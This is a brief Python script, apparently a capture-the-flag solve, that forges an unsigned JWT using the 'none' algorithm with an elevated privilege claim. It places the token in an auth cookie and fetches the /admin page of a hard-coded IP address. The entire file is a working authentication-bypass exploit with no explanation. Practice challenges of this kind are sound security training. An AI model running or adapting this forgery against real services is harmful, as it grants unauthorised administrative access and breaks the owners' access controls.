#!/usr/bin/env python3
import jwt
import requests
url = 'http://95.216.233.106:37077'
s = requests.Session()
s.cookies['auth'] = jwt.encode({'user': 'John', 'privilege': 999}, key='', algorithm='none').decode()
r = s.get(url + '/admin', allow_redirects=False)
assert r.status_code == 200
print(r.content.decode())
